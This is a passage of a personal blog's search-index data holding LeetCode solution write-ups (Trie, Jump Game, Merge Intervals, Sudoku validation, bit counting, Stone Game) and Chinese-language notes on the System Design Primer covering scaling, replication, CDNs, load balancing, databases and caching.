","permalink":"https://littlebees.github.io/2021/01/leetcode-179-largest-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原本以為只要挑數字最大的就好\u0026hellip;\u003c/p\u003e","title":"leetcode-179 - Largest Number"},{"content":"動機 就是trie\nProblem A trie (pronounced as try) or prefix tree is a tree data structure used to efficiently store and retrieve keys in a dataset of strings. There are various applications of this data structure, such as autocomplete and spellchecker.\nImplement the Trie class:\nTrie() Initializes the trie object.void insert(String word) Inserts the string word into the trie.boolean search(String word) Returns true if the string word is in the trie (i.e., was inserted before), and false otherwise.boolean startsWith(String prefix) Returns true if there is a previously inserted string word that has the prefix prefix, and false otherwise. Example 1:\nInput[Trie, insert, search, search, startsWith, insert, search][[], [apple], [apple], [app], [app], [app], [app]]Output[null, null, true, false, true, null, true]ExplanationTrie trie = new Trie();trie.insert(apple);trie.search(apple); // return Truetrie.search(app); // return Falsetrie.startsWith(app); // return Truetrie.insert(app);trie.search(app); // return True Constraints:\n1 \u003c= word.length, prefix.length \u003c= 2000word and prefix consist only of lowercase English letters.At most 3 * 104 calls in total will be made to insert, search, and startsWith. Sol 每一個node有[flag :: bool, hash{char -\u0026gt; Node}]\nflag是指到此是不是某個單字的終點\nclass Trie: def __init__(self): \u0026#34;\u0026#34;\u0026#34; Initialize your data structure here. \u0026#34;\u0026#34;\u0026#34; self.t = [False, {}] def insert(self, w: str) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Inserts a word into the trie. \u0026#34;\u0026#34;\u0026#34; tmp = self.t for c in w: if c not in tmp[1]: tmp[1][c] = [False, {}] tmp = tmp[1][c] tmp[0] = True def search(self, w: str) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34; Returns if the word is in the trie. \u0026#34;\u0026#34;\u0026#34; tmp = self.t for c in w: if c not in tmp[1]: return False tmp = tmp[1][c] return tmp[0] def startsWith(self, p: str) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34; Returns if there is any word in the trie that starts with the given prefix. \u0026#34;\u0026#34;\u0026#34; tmp = self.t for c in p: if c not in tmp[1]: return False tmp = tmp[1][c] return True 另外有C++版\nstruct Trie { unordered_map\u0026lt;char, struct Trie*\u0026gt; nextLevel; bool end; ~Trie() { for (auto\u0026amp; kv : nextLevel) { delete kv.second; } } void insert(string s) { Trie* trie = this; for (auto\u0026amp; c : s) { if (trie-\u0026gt;nextLevel.find(c) == trie-\u0026gt;nextLevel.end()) { trie-\u0026gt;nextLevel[c] = new Trie(); } trie = trie-\u0026gt;nextLevel[c]; } trie-\u0026gt;end = 1; } bool search(string s) { Trie* trie = this; for (auto\u0026amp; c : s) { if (trie-\u0026gt;nextLevel.find(c) != trie-\u0026gt;nextLevel.end()) { trie = trie-\u0026gt;nextLevel[c]; } else { return 0; } } return trie-\u0026gt;end; } bool startsWith(string s) { Trie* trie = this; for (auto\u0026amp; c : s) { if (trie-\u0026gt;nextLevel.find(c) != trie-\u0026gt;nextLevel.end()) { trie = trie-\u0026gt;nextLevel[c]; } else { return 0; } } return 1; } }; ","permalink":"https://littlebees.github.io/2021/01/leetcode-208-implement-trie-prefix-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是trie\u003c/p\u003e","title":"leetcode-208 - Implement Trie (Prefix Tree)"},{"content":"動機 我是看Solution才知道有人用DP\nProblem You are given an integer array nums. You are initially positioned at the array's first index, and each element in the array represents your maximum jump length at that position.\nReturn true if you can reach the last index, or false otherwise.\nExample 1:\nInput: nums = [2,3,1,1,4]Output: trueExplanation: Jump 1 step from index 0 to 1, then 3 steps to the last index.Example 2:\nInput: nums = [3,2,1,0,4]Output: falseExplanation: You will always arrive at index 3 no matter what. Its maximum jump length is 0, which makes it impossible to reach the last index. Constraints:\n1 \u003c= nums.length \u003c= 1040 \u003c= nums[i] \u003c= 105 Sol 每次都是挑最大的間距的位置\nclass Solution: def canJump(self, ns: List[int]) -\u0026gt; bool: i = 0 while i \u0026lt; len(ns)-1 and ns[i] \u0026gt; 0: #print(i) tmp = i for j in range(i+1,len(ns) if i+ns[i]+1 \u0026gt; len(ns) else i+ns[i]+1): #print(tmp,j) tmp = max(tmp,j,key=lambda x: x+ns[x]) if i == tmp: i = i+ns[i] else: i = tmp return i \u0026gt;= len(ns)-1 Case study 從最後的index開始看能不能到目前的最後的index，如果能到，之後就是看後面的index能不能到這裡\n這邊的重點是只要能到終點的點，就是終點\n就像一個範圍越來越大一樣\npublic class Solution { public boolean canJump(int[] nums) { int lastPos = nums.length - 1; for (int i = nums.length - 1; i \u0026gt;= 0; i--) { if (i + nums[i] \u0026gt;= lastPos) { lastPos = i; } } return lastPos == 0; } } ","permalink":"https://littlebees.github.io/2021/01/leetcode-55-jump-game/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我是看Solution才知道有人用DP\u003c/p\u003e","title":"leetcode-55 - Jump Game"},{"content":"動機 這題的解法，其實是解skyline的時候，試過的解法\nProblem Given an array of intervals where intervals[i] = [starti, endi], merge all overlapping intervals, and return an array of the non-overlapping intervals that cover all the intervals in the input.\nExample 1:\nInput: intervals = [[1,3],[2,6],[8,10],[15,18]]Output: [[1,6],[8,10],[15,18]]Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6].Example 2:\nInput: intervals = [[1,4],[4,5]]Output: [[1,5]]Explanation: Intervals [1,4] and [4,5] are considered overlapping. Constraints:\n1 \u003c= intervals.length \u003c= 104intervals[i].length == 20 \u003c= starti \u003c= endi \u003c= 104 Sol stk放所有interval\n每當加入新interval時，就從最後的interval開始比，看要merge、覆蓋還是直接推進去\nclass Solution: def merge(self, ints: List[List[int]]) -\u0026gt; List[List[int]]: stk = [] ints.sort(key=lambda x: x[0]) for i in ints: while stk and i[0] \u0026lt;= stk[-1][1]: if i[1] \u0026lt;=stk[-1][1]: # included i = stk.pop() else: tmp = stk.pop() i[0] = tmp[0] stk.append(i) return stk ","permalink":"https://littlebees.github.io/2021/01/leetcode-56-merge-intervals/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題的解法，其實是解skyline的時候，試過的解法\u003c/p\u003e","title":"leetcode-56 - Merge Intervals"},{"content":"動機 照題目做\nProblem Determine if a 9 x 9 Sudoku board is valid. Only the filled cells need to be validated according to the following rules:\nEach row must contain the digits 1-9 without repetition.Each column must contain the digits 1-9 without repetition.Each of the nine 3 x 3 sub-boxes of the grid must contain the digits 1-9 without repetition.Note:\nA Sudoku board (partially filled) could be valid but is not necessarily solvable.Only the filled cells need to be validated according to the mentioned rules. Example 1:\nInput: board = [[5,3,.,.,7,.,.,.,.],[6,.,.,1,9,5,.,.,.],[.,9,8,.,.,.,.,6,.],[8,.,.,.,6,.,.,.,3],[4,.,.,8,.,3,.,.,1],[7,.,.,.,2,.,.,.,6],[.,6,.,.,.,.,2,8,.],[.,.,.,4,1,9,.,.,5],[.,.,.,.,8,.,.,7,9]]Output: trueExample 2:\nInput: board = [[8,3,.,.,7,.,.,.,.],[6,.,.,1,9,5,.,.,.],[.,9,8,.,.,.,.,6,.],[8,.,.,.,6,.,.,.,3],[4,.,.,8,.,3,.,.,1],[7,.,.,.,2,.,.,.,6],[.,6,.,.,.,.,2,8,.],[.,.,.,4,1,9,.,.,5],[.,.,.,.,8,.,.,7,9]]Output: falseExplanation: Same as Example 1, except with the 5 in the top left corner being modified to 8. Since there are two 8's in the top left 3x3 sub-box, it is invalid. Constraints:\nboard.length == 9board[i].length == 9board[i][j] is a digit or '.'. Sol def h(b,i,j): hi2 = Counter([int(b[x][j]) for x in range(len(b)) if b[x][j] != \u0026#34;.\u0026#34;]) #print(hi2,i,j) for n in range(1,10): n = int(n) #print(hi2.get(n,0)) if hi2.get(n,0) \u0026gt; 1: return False return True def f(b,i,j): hi = Counter([int(b[i][x]) for x in range(len(b)) if b[i][x] != \u0026#34;.\u0026#34;]) for n in range(1,10): n = int(n) if hi.get(n,0) \u0026gt; 1: return False return True def g(b,i,j): hi = set() for a in range(i,i+3): for bb in range(j,j+3): if b[a][bb] != \u0026#34;.\u0026#34;: if b[a][bb] not in hi: hi.add(b[a][bb]) else: return True return False class Solution: def isValidSudoku(self, b: List[List[str]]) -\u0026gt; bool: for i in range(0,9,3): for j in range(0,9,3): if g(b,i,j): return False return all([h(b,0,j) for j in range(len(b))]) and all([f(b,i,0) for i in range(len(b))]) ","permalink":"https://littlebees.github.io/2021/01/leetcode-36-valid-sudoku/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e照題目做\u003c/p\u003e","title":"leetcode-36 - Valid Sudoku"},{"content":"動機 雖然說是水題，但是在LC的Solution中，卻有一個有趣的解法\nProblem Write a function that takes an unsigned integer and returns the number of '1' bits it has (also known as the Hamming weight).\nNote:\nNote that in some languages, such as Java, there is no unsigned integer type. In this case, the input will be given as a signed integer type. It should not affect your implementation, as the integer's internal binary representation is the same, whether it is signed or unsigned.In Java, the compiler represents the signed integers using 2's complement notation. Therefore, in Example 3, the input represents the signed integer. -3. Example 1:\nInput: n = 00000000000000000000000000001011Output: 3Explanation: The input binary string 00000000000000000000000000001011 has a total of three '1' bits.Example 2:\nInput: n = 00000000000000000000000010000000Output: 1Explanation: The input binary string 00000000000000000000000010000000 has a total of one '1' bit.Example 3:\nInput: n = 11111111111111111111111111111101Output: 31Explanation: The input binary string 11111111111111111111111111111101 has a total of thirty one '1' bits. Constraints:\nThe input must be a binary string of length 32. Follow up: If this function is called many times, how would you optimize it? Sol1 一直除2看有幾次奇數\nclass Solution: def hammingWeight(self, n: int) -\u0026gt; int: ret = 0 while n != 0: if n % 2 == 1: ret += 1 n = n//2 return ret Case study 10轉成binary，是 01010\n如果10-1會從離左手邊最近的1借位，所以會變成 01001\n注意到，到左手邊最近的1之間的所有0，都變成1了!!\n同時因為借位，所以最近的1變成0\n最後只要與原本的數字做AND，就會把 左手邊最近的1之間的所有1 ，都變成0了!!\n01010 (10) [-1] 01001 (9) [\u0026amp;n] 01000 (8) 這樣只要到0之前一直這樣做就好了!!\npublic int hammingWeight(int n) { int sum = 0; while (n != 0) { sum++; n \u0026amp;= (n - 1); } return sum; } ","permalink":"https://littlebees.github.io/2021/01/leetcode-191-number-of-1-bits/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e雖然說是水題，但是在LC的Solution中，卻有一個有趣的解法\u003c/p\u003e","title":"leetcode-191 - Number of 1 Bits"},{"content":"動機 每次看到math的解法，都會想是不是有鬼，所以不會去想，還有原本就是要練DP，所以要不會往那邊想\u0026hellip;\nProblem Alex and Lee play a game with piles of stones. There are an even number of piles arranged in a row, and each pile has a positive integer number of stones piles[i].\nThe objective of the game is to end with the most stones. The total number of stones is odd, so there are no ties.\nAlex and Lee take turns, with Alex starting first. Each turn, a player takes the entire pile of stones from either the beginning or the end of the row. This continues until there are no more piles left, at which point the person with the most stones wins.\nAssuming Alex and Lee play optimally, return True if and only if Alex wins the game.\nExample 1:\nInput: piles = [5,3,4,5]Output: trueExplanation: Alex starts first, and can only take the first 5 or the last 5.Say he takes the first 5, so that the row becomes [3, 4, 5].If Lee takes 3, then the board is [4, 5], and Alex takes 5 to win with 10 points.If Lee takes the last 5, then the board is [3, 4], and Alex takes 4 to win with 9 points.This demonstrated that taking the first 5 was a winning move for Alex, so we return true. Constraints:\n2 \u003c= piles.length \u003c= 500piles.length is even.1 \u003c= piles[i] \u003c= 500sum(piles) is odd. Sol 取前取後一個一個試\nclass Solution: @functools.cache def f(self,start,size,alex): mul = 1 if alex else -1 if size == 1: return mul*self.ps[start] else: return min(self.f(start,size-1,not alex)+self.ps[start+size-1], self.f(start+1,size-1,not alex)+self.ps[start]) def stoneGame(self, ps: List[int]) -\u0026gt; bool: self.ps = ps return self.f(0,len(ps), True) case study 對手只能挑剩的，所以一定是先手贏\nclass Solution: def stoneGame(self, ps: List[int]) -\u0026gt; bool: return True ","permalink":"https://littlebees.github.io/2021/01/leetcode-877-stone-game/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e每次看到math的解法，都會想是不是有鬼，所以不會去想，還有原本就是要練DP，所以要不會往那邊想\u0026hellip;\u003c/p\u003e","title":"leetcode-877 - Stone Game"},{"content":"動機 這是system design primer筆記的最後一篇，講要怎麼把system一步一步scale out 但還是有沒提到的部分，像NoSQL/SQL的實際比較、DB的優化手法比較，這些都是輕描淡寫帶過去而已，儘管如此\n建議閱讀順序 先讀 Design a system that scales to millions of users on AWS 再看其他題目\n整理 keyword大概的感覺 API: controller in MVC service: functions implmenting bussness logic evoluation 從single box一步一步把功能分離出來，要注意手法是怎麼與痛點關連起來\n其實最核心的想法是把bottleneck分離出來，如果分離出來還不夠，就是多台(水平scale)，之後就是自動scale，來省$$\nDB的多台就是failover或是replica，還有一種是分割，有 從table去切、從DB去切\n最後設計系統就是分析需求，把動詞找出來，變成service，之後開API給使用者呼叫\nsingle box web server: DB(structrual\u0026amp;static\u0026amp;tmp) + APP write(real-time\u0026amp;batch) + APP read + Req handle(session data) + SSL how to scale: Vertical Scaling Use basic monitoring to determine bottlenecks: CPU, memory, IO, network, etc No redundancy/failover expensive separate storage(DB + obejct store) pain: MySQL Database taking up more and more memory and CPU resources web server: APP write(real-time\u0026amp;batch) + APP read + Req handle + SSL DB: DB(structrual\u0026amp;tmp)(write\u0026amp;read) obejct store: SQL/NoSQl/S3(static) Horizontal Scaling \u0026amp; separate APP pain: single Web Server bottlenecks during peak hours laod balancers: SSL web servers: Req handle APP writes: APP write(real-time\u0026amp;batch) APP reads: APP raed DBs: DB(structrual\u0026amp;tmp)(write\u0026amp;read) (active-active or active-passive) CDN: proxy server to object store(static) obejct store: SQL/NoSQl/S3(static) how to scale: Horizontal Scaling multiple instances to handle requests memory cache \u0026amp; read replicas pain: read-heavy laod balancers: SSL web servers: Req handle APP writes: APP write(real-time\u0026amp;batch) APP reads: APP raed memory cache: memory cache(structrual) DBs: DB(structrual\u0026amp;tmp)(write) (active-active or active-passive) DBs: DB(structrual\u0026amp;tmp)(read) (active-active or active-passive) CDN: proxy server to object store(static) obejct store: SQL/NoSQl/S3(static) memory cache \u0026amp; read replicas pain: traffic spikes during regular business hours and drop significantly (cost) laod balancers: SSL auto-scaling (CPU load, Latency, Network traffic, Custom metric) web servers: Req handle APP writes: APP write(real-time\u0026amp;batch) APP reads: APP raed memory cache: memory cache(structrual) DBs: DB(structrual\u0026amp;tmp)(write) (active-active or active-passive) DBs: DB(structrual\u0026amp;tmp)(read) (active-active or active-passive) CDN: proxy server to object store(static) obejct store: SQL/NoSQl/S3(static) how to scale: Horizontal Scaling multiple instances to handle requests Automate DevOps Continue monitoring metrics to address bottlenecks Host level - Review a single EC2 instance Aggregate level - Review load balancer stats Log analysis - CloudWatch, CloudTrail, Loggly, Splunk, Sumo External site performance - Pingdom or New Relic Handle notifications and incidents - PagerDuty Error Reporting - Sentry async write \u0026amp; DB optimization pain: DB starts to grow too large \u0026amp; high read\u0026amp;write req laod balancers: SSL auto-scaling (CPU load, Latency, Network traffic, Custom metric) web servers: Req handle APP writes: APP write(real-time\u0026amp;batch) APP reads: APP raed queues: msg queue worker services: handle req memory cache: memory cache(structrual) NoSQL: DB(tmp) DBs: DB(structrual)(write) (active-active or active-passive) SQL scaling patterns include: Federation Sharding Denormalization SQL Tuning DBs: DB(structrual)(read) (active-active or active-passive) SQL scaling patterns include: Federation Sharding Denormalization SQL Tuning CDN: proxy server to object store(static) obejct store: SQL/NoSQl/S3(static) Ref source\n","permalink":"https://littlebees.github.io/2021/01/system-design-primer%E7%AD%86%E8%A8%98-%E7%AF%84%E4%BE%8B%E7%AF%87/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這是system design primer筆記的最後一篇，講要怎麼把system一步一步scale out\n但還是有沒提到的部分，像NoSQL/SQL的實際比較、DB的優化手法比較，這些都是輕描淡寫帶過去而已，儘管如此\u003c/p\u003e","title":"system design primer筆記 範例篇"},{"content":"動機 這次是設計流程與估算\n設計系統，要先做出評估與假設\n分成user與system\nuser部分要問，誰會用、怎麼用、多少人\n對system而言，會先收到request，之後變成data，之後要io\n所以system部分要問，做什麼、input/output是、每秒處理多少request、希望處理多少資料、預期的讀、寫比例\n系統設計流程 描述使用的場景、限制及假設 user 誰會使用這個系統 他們怎麼使用系統 有多少使用者 system 系統的作用是什麼 系統的輸入和輸出是什麼 輸入 希望每秒處理多少請求 預期希望處理多少資料 預期的讀、寫比例為何 user*N == req*N ==\u0026gt; (system :: read/write) == res ==\u0026gt; user 建立一個高階的設計 畫出主要的元件與其相互連接情況 設計核心的元件 對每一個核心元件進行深入的分析 (要用什麼實作, SQL/NoSQL, schema, \u0026hellip;) 評估你的設計 確認及指出你的設計的瓶頸與限制 估算 Read 1 MB sequentially from memory: 250 us Read 1 MB sequentially from SSD: 1,000 us,1 ms (~1GB/sec SSD, 4X memory) Read 1 MB sequentially from 1 Gbps: 10,000 us,10 ms (40x memory, 10X SSD) Read 1 MB sequentially from disk: 30,000 us,30 ms (120x memory, 30X SSD) ","permalink":"https://littlebees.github.io/2021/01/system-design-primer%E7%AD%86%E8%A8%98-%E8%A8%AD%E8%A8%88%E6%B5%81%E7%A8%8B%E8%88%87%E4%BC%B0%E7%AE%97%E7%AF%87/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這次是設計流程與估算\u003c/p\u003e\n\u003cp\u003e設計系統，要先做出評估與假設\u003c/p\u003e\n\u003cp\u003e分成user與system\u003c/p\u003e\n\u003cp\u003euser部分要問，誰會用、怎麼用、多少人\u003c/p\u003e\n\u003cp\u003e對system而言，會先收到request，之後變成data，之後要io\u003c/p\u003e\n\u003cp\u003e所以system部分要問，做什麼、input/output是、每秒處理多少request、希望處理多少資料、預期的讀、寫比例\u003c/p\u003e","title":"system design primer筆記 設計流程與估算篇"},{"content":"動機 會知道system design primer是因為某場面試，原本以為system design在網路上沒有什麼資料\n結果是很多資料，但是system design資料會多，很大一部分是system design包含的面向很廣\n所以來整理一下，作為了解的開始\n這篇是介紹會用到的工具，接下來是設計 但設計還要帶一下估計的方法與常用數字\n所以之後還有兩篇要整理\n取捨 效能 vs 可擴展性 效能: 服務更多的工作單元，也可以處理更多的資料 性能問題: 對單一使用者來說的感覺是慢的 可擴展性: 服務性能的增加和資源的投入是成正比 可擴展性問題: 對於單一使用者來說感覺較快，但在高負載的時候就會變慢 延遲 vs 吞吐量 延遲: 執行一個操作或運算結果所花費的時間 吞吐量: 單位時間內執行此類型操作或運算的數量 可接受的延遲數量下的最大化吞吐量 為設計目標 可用性 vs 一致性 CAP 理論: 在一個分散式系統中，只能滿足以下三個項目的任兩項 一致性: 每次讀取都可以得到最新的資料，但偶爾會拿到錯誤 弱一致性 在寫入之後，任何的存取不一定可以拿到資料，弱一致性將盡力確保能存取到最新的資料 (錯過就沒了) 例子: 視訊聊天、藍芽耳機的延遲 最終一致性 在寫入後的讀取操作最終可以看到被寫入的資料資料透過非同步的方式被複製 例子: DNS、NoSQL (需要等一段時間傳播) 強一致性 在寫入後，讀取將立刻取得資料，資料是透過同步的方式寫入 例子: FileSystem、SQL 可用性: 每次讀取都可以得到非錯誤的回應，但不能保證可以得到最新的資料 容錯轉移 主動到備用切換 當 heartbeat 中斷時，備用的機器就會切換為主動機器的 IP 位置接替服務 只有處於主動的機器會處理使用者來的流量 雙主動切換 兩台伺服器都會負責處理流量 流量會在他們之間進行分散負載 缺點 load balancer或是服務需要知道這些主動的機器 缺點 增加額外的硬體與複雜度 如果在新寫入的資料被複製到備用的機器前系統就發生故障，那有可能會遺失資料 複寫 主動到備用複寫(主從複寫) 主資料庫負責讀和寫 將寫入的資料複寫至一或多個從屬資料庫中 從屬資料庫只負責讀取 從屬資料庫可以再將寫入複製到更多以樹狀結構的其他資料庫中 如果主資料庫離線了 系統可以以只讀模式運行，直到 某個從屬資料庫被提升為主資料庫 OR 新的主資料庫出現 雙主動複寫(主動模式複寫) 兩個主要的資料庫都負責讀取和寫入，並且兩者互相協調 如果主資料庫離線了，系統可以繼續運作 缺點 load balancer或是服務需要知道這些主動的機器，決定寫入哪台 大多數無法保證一致性(違反 ACID) 因同步而產生寫入延遲 隨著更多寫入節點的增加和延遲的提高，如何解決衝突變複雜 缺點 複製 上的問題 如果在主要資料庫複製到其他結點前系統就失效，則會有資料丟失的可能 多讀取節點的問題 當有過多寫入時，讀取的資料庫可能會因為過多寫入操作而被阻塞，導致讀取功能異常 當讀取的資料庫越多時，需要複寫的資料庫越多，將會導致較為嚴重的延遲 在某些資料庫系統中，寫入主資料庫的操作可以用多執行緒來並行寫入，但讀取的資料庫只支援單一執行緒來循序寫入 複雜度 複寫意味著更多的硬體以及更高的複雜度 部分容錯性: 在任意分區的網路故障情況下，系統仍然能夠持續運行 網路是不可靠的，你的設計必須要確保部分容錯性，所以你只能夠在一致性與可用性中做出取捨 CP: 一致性與部分容錯性 可能因超時而報錯 AP: 可用性與部分容錯性 都拿的到資料，但不一定是最新的 (拿到舊的不是錯誤) 工具 DNS NS, MX, CNAME, A record load balance Weighted round robin 基於延遲分流 基於地理位置分流 缺點 DNS的query會有延遲 DNS管理複雜 會被DDOS CDN 推送式 CDNs (callback) 當你的伺服器有檔案變動時，推送 CDN 會接收到新的變動內容 流量較小的網站，或是內容不是經常更新的網站使用推送式的 CDN 相當適合 可以設定檔案內容什麼時候過期以及何時更新，檔案內容只有在變更或新增的時候才會推送，最小化流量，但最大化儲存 拉取式 CDNs (on-demand) 當地一個使用者來請求該資源時，才從伺服器上抓取對應檔案 拉取式 CDN 可以節省儲存空間 在過期的文件被更新之前，則會導致多餘的流量 拉取式的 CDN 適合高流量的網站，因為檔案會被平均的分散在各個結點伺服器中 缺點 CDN 的成本取決於流量，可能會因為成本而放棄使用 如果在 TTL 過期之前就更新內容，CDN 的緩存內容可能會過期 需要改變靜態內容的網址來指向 CDN load balancer 分配方式 隨機 最少負載 Session/cookies Weighted round robin 第四層負載平衡 第四層的負載平衡器會監看 傳輸層 的資訊來決定如何分發請求 (5 tuple) 透過 網路地址轉換(NAT) 來向上游的伺服器轉發資料 第七層負載平衡 第七層的負載平衡器會監看 應用層 來決定如何分發請求這包含了請求的 header、訊息和 cookies (DPI) 第四層的負載平衡比起第七層的所要花費的時間和計算資源更低 水平擴展 缺點 水平擴展會增加複雜性，同時也涉及了多台伺服器的議題 快取伺服器或資料庫需要隨著伺服器的增加而進行擴展，以便處理更多的請求 好處 SSL Termination: 將傳入的請求解密，並且加密伺服器的回應 Session 保存: 發行 cookie，並將特定使用者的請求路由到同樣的後端伺服器上 缺點 當負載平衡器資源不夠或沒有正確設定時，他可能會成為效能的瓶頸 會增加架構的複雜性 只有一台負載平衡器時，一樣有單點失敗的問題 reversed proxy 好處 隱藏後端伺服器的資訊、可以設定 IP 的黑名單、限制每個客戶端的連線數量等 增加可擴展性與靈活性 - 客戶端只會看到反向代理伺服器的 IP 或域名 SSL 終止 - 解密傳入的請求、加密伺服器的回應，這樣後端伺服器就不需要進行這些高成本的操作 壓縮 - 壓縮伺服器的回應 快取 - 直接在代理伺服器回應命中快取的結果 缺點 引入反向代理伺服器會增加系統複雜度 只有一台反向代理伺服器會有單點失效的問題，而設定多台的反向代理伺服器(如 故障轉移 )同樣會增加系統複雜度 負載平衡器與反向代理 當有多台伺服器時，使用負載平衡非常有用，一般來說，負載平衡器會將流量路由給一組功能相同的伺服器上 即使只有一台伺服器或應用伺服器，反向代理也是有用的 container orchestration platform 微服務 可以獨立運作、小型的模組化服務每個服務會透過明確定義好的輕量級溝通機制，運作在一個獨立的流程中來共同實現一個目標 服務發現 透過註冊的名稱、位置、Port 等資訊來幫助各個服務發現彼此 Health checks 可以幫助確認服務的完整性以及是否經常使用一個 HTTP 的路徑 缺點 設計多個鬆耦合微服務所組成的應用層，必須從架構、維運、流程等多個面向來考量，相對於單系統而言會非常不同 微服務會增加部署與維運的複雜度 DB RDBMS(SQL) 特性: ACID 原子性 - 每一個資料庫事務操作要不就是全部完成，要不就是全部不完成 一致性 - 任何一個資料庫事務操作都會讓資料庫從一個有效的狀態轉換到另外一個有效狀態 隔離性 - 併發執行資料庫事務操作的結果會和循序執行的結果一致 持久性 - 一旦一個事務被資料庫執行後，他的結果與影響是擁永久保存的 複寫 見 CAP中的可用性的複寫 federative database 將資料庫按照對應的功能進行分割 好處 減少每個資料庫寫入與讀取的流量，進而降低複製的延遲 較少的資料意味者更多適合放入記憶體中的資料，進而增加快取命中率 因為沒有循序寫入的中央式主資料庫，你可以並行寫入以增加吞吐量 缺點 如果你的資料表需要大量的功能和資料表，聯邦式資料庫的效率並不好 需要更新應用程式的邏輯來決定如何讀取和寫入到哪個資料庫 透過 server link 從兩個資料庫中關資料更加複雜 聯邦式資料庫需要更多的硬體和額外的複雜度 Sharding 將資料分配在不同的資料庫上，使每個資料庫只管理整個資料的部分子集 好處 可以減少讀取和寫入的流量、減少複製並提高快取命中率 索引的容量也會減少，如此一來可以改善查詢的效能 當一個分片出現問題時，其餘的仍然可以正常運作 分片的機制並沒有中央式的資料庫，你可以並行寫入以增加吞吐量 缺點 為了避免資料遺失，你可能需要思考其他複寫的機制 你需要修改應用程式的邏輯來實作分片，這可能會導致 SQL 變得複雜 不合理的分片可能會導致資料負載不均 從多個分片中操作資料會很複雜 分片需要額外的硬體和複雜度 Denormalization 不同資料表中的重複資料來避免高成本的 Join 操作 好處 反正規化可以避免，如處理跨資料中心 Join 操作 資料會重複存取 Constraints 的機制可以讓重複的資料保持同步，但這樣會增加資料庫設計的複雜度 反正規化的資料庫在大量寫入負載的情況下，性能表現可能會比正規化的資料庫差 SQL Tuning improve schema use properly index index特性 設定索引時，會將資料放置於記憶體中，會佔用更多記憶體空間 索引通常是使用平衡 B 樹 表示，這樣可以保證資料是有序的，並允許在對數時間內進行搜尋、循序訪問以及插入、刪除等操作 SELECT, GROUP BY, ORDER BY, JOIN 中使用有index的欄位，來加速查詢 缺點 寫入操作會變慢，因為索引會需要更新 當讀取大量資料時，禁用索引再讀取，之後再重新建立索引 split table 將熱門的資料拆分到單獨的資料表中可以增加快取 avoid complex joining 反正規化 NoSQL 特性: BASE Basicly Avalibility: 系統保證可用性 Soft state: 系統的狀態可能隨著時間改變，即使在沒有輸入的情況下也是如此 eventually consistent - 經過一段時間之後，在沒有收到任何輸入的情況下，系統最終會達到一致 鍵-值對 (hash table) 通常用來儲存簡單的資料模型或是頻繁修改的資料 文件類型 (文件當做值的value的hash table) 文件類型的資料庫具備高度靈活性(不會看到一堆NULL)，通常用於處理偶爾變化的資料 列儲存型 (巢狀的 Map ColumnFamily\u0026lt;RowKey, Columns\u0026lt;ColKey, Value, Timestamp\u0026gt;\u0026gt;) 原本是一個ID得到 row(\u0026lt;item1, item2, ...\u0026gt;) 現在是一個item對到一個ID，可以當成把table依column切開 列儲存型態的資料的提供了高可用和高擴展性，通常被用在大量資料的儲存上 圖形 (圖) 圖形資料庫針對表示外來鍵(Foreign Key)眾多的複雜關聯或多對多關聯進行優化 圖形資料庫為了儲存複雜的資料結構，例如社群網路，提供了很高的性能 SQL 或 NoSQL SQL 結構化資料、嚴格的 schema 需要複雜的 join transaction 既有資源豐富 有index NoSQL 半結構化資料、動態或具有彈性的 schema 不需要複雜的 joins 儲存 TB (或 PB) 等級的資料 高資料密集量的工作負載 IOPS 的高吞吐量 適合使用 NoSQL 暫時性的資料 經常頻繁存取的資料 快取 資料庫在資料均勻分布的情況下，讀取和寫入的效能是最好的 但是熱門的資料會讓讀取分佈不均，如此一來就會造成效能瓶頸 在資料庫前增加一個快取，就可以減少負載不均和突發流量所造成的影響\n客戶端 (作業系統或瀏覽器) CDN DB 應用程式 (基於記憶體的快取，像是 Memcached 和 Redis) 快取的級別 資料庫查詢 記錄級別 查詢級別 注意 當你的查詢很複雜時，很難刪除快取內容 如果某個資料表中的某個欄位值改變時，需要刪除所有可能包含該欄位值的快取結果 物件 (應該避免文件檔案的快取，因為這會讓複製和自動擴展變得困難) 完整的可序列化物件 完整的 HTML 注意 如果物件內的基本資料已經改變，那應該要從快取中刪除這個物件 允許異步處理：workers 透過使用最新的快取來組裝物件 建議快取的資料 使用者 sessions 完整渲染的頁面 活動資訊 使用者資料圖表 快取策略 Write around 應用程式負責從儲存裝置中進行讀取及寫入快取不直接和儲存裝置進行互動 過程 讀快取、拉資料、寫到快取 (讀的都一樣，下面就pass) 直接寫到DB 缺點 當請求的資料不在快取中時，就需要經過三個步驟來獲得資料，這會導致明顯的延遲 如果資料庫中的資料被更新了，會導致快取中的資料過時，這需要透過設定 TTL 強制更新快取，或透過Write through來解決這種問題 當快取的某個節點發生故障時，會需要被一個新的節點取代，這會導致延遲 Write through 應用程式使用快取當作主要的資料儲存服務，將資料寫入/讀取到快取中，由快取服務負責向資料庫讀寫資料 過程 寫快取、寫到資料庫 缺點 當發生故障或因為水平擴展而產生新的節點時，新的節點中將不會有快取資料，直到資料庫更新為止 快取模式和寫入模式一起使用可以減緩這種現象 被寫入多數的資料可能永遠都不會被讀取 可以設定 TTL 來解決這種問題 Write back 應用程式使用快取當作主要的資料儲存服務，將資料寫入/讀取到快取中，由快取服務負責向資料庫*-非同步的*-讀寫資料 過程 寫快取、寫到Queue、return、(等一下)寫到DB 缺點 快取可能在資料成功寫入到儲存單元前就丟失 事後寫入比起快取模式或是直寫模式在實作上更為複雜 更新式快取 將快取設定為在到期之前就自動更新為最新存取的內容 (由server推資料) 過程 server寫到快取、等client讀 缺點 